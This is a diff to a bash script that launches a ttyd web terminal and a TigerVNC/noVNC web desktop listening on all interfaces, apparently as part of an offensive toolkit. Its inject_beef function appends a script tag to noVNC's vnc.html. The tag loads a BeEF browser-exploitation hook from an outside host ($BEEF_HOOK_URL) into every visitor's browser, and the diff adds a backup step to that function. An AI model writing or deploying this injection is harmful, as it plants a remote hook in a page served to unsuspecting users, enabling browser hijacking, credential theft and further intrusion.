@@ -1,7 +1,51 @@
 #!/bin/bash
+# shellcheck disable=SC2155,SC2034
+set -e
+set -o pipefail
 # ============================================================================
 # SERVICE MANAGEMENT
 # ============================================================================
+
+configure_vnc_password() {
+    local user="$1"
+    local password="$VNC_PASSWORD"
+
+    log "cyan" "🔐 Setting VNC password for $user..."
+
+    # Create .vnc directory if it doesn't exist
+    sudo mkdir -p "/home/$user/.vnc"
+    log "blue" "📁 Created .vnc directory"
+
+    # Check which vncpasswd command is available
+    local vncpasswd_cmd=""
+    if command -v tigervncpasswd &>/dev/null; then
+        vncpasswd_cmd="tigervncpasswd"
+        log "blue" "🔧 Using tigervncpasswd"
+    elif command -v vncpasswd &>/dev/null; then
+        vncpasswd_cmd="vncpasswd"
+        log "blue" "🔧 Using vncpasswd"
+    else
+        log "red" "❌ Neither tigervncpasswd nor vncpasswd found"
+        die "VNC password utility not found. Please install tigervnc-common or vncpasswd"
+    fi
+
+    # Set VNC password using the available command
+    log "blue" "🔑 Generating VNC password file..."
+    echo "$password" | sudo "$vncpasswd_cmd" -f | sudo tee "/home/$user/.vnc/passwd" > /dev/null
+    if [[ $? -ne 0 ]]; then
+        log "red" "❌ Failed to generate VNC password file"
+        die "$vncpasswd_cmd command failed"
+    fi
+
+    # Fix ownership and permissions
+    local user_group=$(id -gn "$user")
+    sudo chown -R "$user:$user_group" "/home/$user/.vnc"
+    sudo chmod 700 "/home/$user/.vnc"
+    sudo chmod 600 "/home/$user/.vnc/passwd"
+
+    log "blue" "🔒 Fixed ownership and permissions for .vnc directory"
+    success "✓ VNC password configured for $user"
+}
 
 configure_novnc() {
     if [[ -f "/usr/share/novnc/vnc.html" && ! -f "/usr/share/novnc/index.html" ]]; then
@@ -10,44 +54,73 @@ configure_novnc() {
 }
 
 start_ttyd() {
-    log "blue" "Starting ttyd..." "💬"
+    log "cyan" "🚀 Starting terminal service (ttyd)..."
     install_ttyd
-    
+
     if [[ "$DISABLE_SSL" == true ]]; then
-        warn "Starting ttyd WITHOUT SSL."
-        sudo -u "$TEMP_USER" ttyd -c "$TTYD_USERNAME:$TTYD_PASSWD" -p "$TTYD_PORT" bash &
+        log "yellow" "⚠️  Starting ttyd WITHOUT SSL encryption"
+        sudo -u "$TEMP_USER" ttyd -c "$TTYD_USERNAME:$TTYD_PASSWD" -p "$TTYD_PORT" -a 0.0.0.0 bash >/dev/null 2>&1 &
     else
-        success "Starting ttyd WITH SSL."
+        log "green" "🔒 Starting ttyd WITH SSL encryption"
+        # Ensure SSL certificates have correct permissions
+        if [[ -f "$SSL_CERT" && -f "$SSL_KEY" ]]; then
+            sudo chown "$TEMP_USER:$TEMP_USER" "$SSL_CERT" "$SSL_KEY" 2>/dev/null || true
+            sudo chmod 644 "$SSL_CERT" 2>/dev/null || true
+            sudo chmod 600 "$SSL_KEY" 2>/dev/null || true
+        fi
         sudo -u "$TEMP_USER" ttyd -S --ssl -C "$SSL_CERT" -K "$SSL_KEY" \
-            -c "$TTYD_USERNAME:$TTYD_PASSWD" -p "$TTYD_PORT" bash &
+            -c "$TTYD_USERNAME:$TTYD_PASSWD" -p "$TTYD_PORT" -a 0.0.0.0 bash >/dev/null 2>&1 &
     fi
+    sleep 2
+    success "✓ Terminal service started on port $TTYD_PORT"
 }
 
 start_vnc_server() {
-    log "blue" "Starting TigerVNC server for $TEMP_USER..." "💻"
-    
+    log "cyan" "🖥️  Starting VNC server for $TEMP_USER..."
+
+    # Configure VNC password
+    configure_vnc_password "$TEMP_USER"
+
+    # Kill existing VNC server if running
+    if sudo -u "$TEMP_USER" vncserver -list 2>/dev/null | grep -q "$VNC_DISPLAY"; then
+        log "yellow" "🗑️  Removing existing VNC server on $VNC_DISPLAY"
+        sudo -u "$TEMP_USER" vncserver -kill "$VNC_DISPLAY" 2>/dev/null || true
+        sleep 1
+    fi
+
+    log "blue" "📺 Display: $VNC_DISPLAY | Resolution: $VNC_GEOMETRY | Depth: $VNC_DEPTH"
+
     if sudo -u "$TEMP_USER" tigervncserver "$VNC_DISPLAY" -geometry "$VNC_GEOMETRY" \
-        -depth "$VNC_DEPTH" -rfbport "$VNC_PORT" -SecurityTypes VncAuth -localhost no; then
-        success "TigerVNC server started successfully."
+        -depth "$VNC_DEPTH" -rfbport "$VNC_PORT" -SecurityTypes VncAuth -localhost no >/dev/null 2>&1; then
+        success "✓ VNC server started successfully on display $VNC_DISPLAY"
     else
-        die "Failed to start TigerVNC server."
+        die "Failed to start VNC server."
     fi
 }
 
 start_novnc() {
-    log "blue" "Starting noVNC..." "💻"
+    log "cyan" "🌐 Starting web VNC interface (noVNC)..."
     configure_novnc
-    
+
     if [[ "$DISABLE_SSL" == true ]]; then
-        warn "Starting noVNC WITHOUT SSL."
+        log "yellow" "⚠️  Starting noVNC WITHOUT SSL encryption"
         sudo -u "$TEMP_USER" /usr/share/novnc/utils/novnc_proxy \
-            --vnc "127.0.0.1:$VNC_PORT" --listen "$NOVNC_PORT" &
+            --vnc "127.0.0.1:$VNC_PORT" --listen "0.0.0.0:$NOVNC_PORT" >/dev/null 2>&1 &
     else
-        success "Starting noVNC WITH SSL."
-        sudo -u "$TEMP_USER" /usr/share/novnc/utils/novnc_proxy \
-            --vnc "127.0.0.1:$VNC_PORT" --listen "$NOVNC_PORT" \
-            --cert "$SSL_CERT" --key "$SSL_KEY" --ssl-only &
+        log "green" "🔒 Starting noVNC WITH SSL encryption"
+        # Ensure SSL certificates have correct permissions
+        if [[ -f "$SSL_CERT" && -f "$SSL_KEY" ]]; then
+            sudo chown "$TEMP_USER:$TEMP_USER" "$SSL_CERT" "$SSL_KEY" 2>/dev/null || true
+            sudo chmod 644 "$SSL_CERT" 2>/dev/null || true
+            sudo chmod 600 "$SSL_KEY" 2>/dev/null || true
+        fi
+        sudo -u "$TEMP_USER" SSL_CERT="$SSL_CERT" SSL_KEY="$SSL_KEY" \
+            /usr/share/novnc/utils/novnc_proxy \
+            --vnc "127.0.0.1:$VNC_PORT" --listen "0.0.0.0:$NOVNC_PORT" \
+            --cert "$SSL_CERT" --key "$SSL_KEY" --ssl-only >/dev/null 2>&1 &
     fi
+    sleep 2
+    success "✓ Web VNC interface started on port $NOVNC_PORT"
 }
 
 # ============================================================================
@@ -63,6 +136,14 @@ inject_beef() {
     
     log "red" "Injecting BeEF into noVNC..." "💉"
     
+    # Create backup of original file
+    local backup_file="${VNC_FILE}.backup.$(date +%Y%m%d_%H%M%S)"
+    
+    if [[ -f "$VNC_FILE" ]]; then
+        log "yellow" "Creating backup: $backup_file" "💾"
+        sudo cp "$VNC_FILE" "$backup_file"
+    fi
+    
     if [[ ! -f "$INDEX_FILE" ]]; then
         log "red" "Creating index.html and injecting script..." "💉"
         sudo cp "$VNC_FILE" "$INDEX_FILE"
@@ -72,4 +153,6 @@ inject_beef() {
     fi
     
     echo "<script src='$BEEF_HOOK_URL'></script>" | sudo tee -a "$VNC_FILE" > /dev/null
+    
+    success "BeEF injected. Backup saved to: $backup_file"
 }
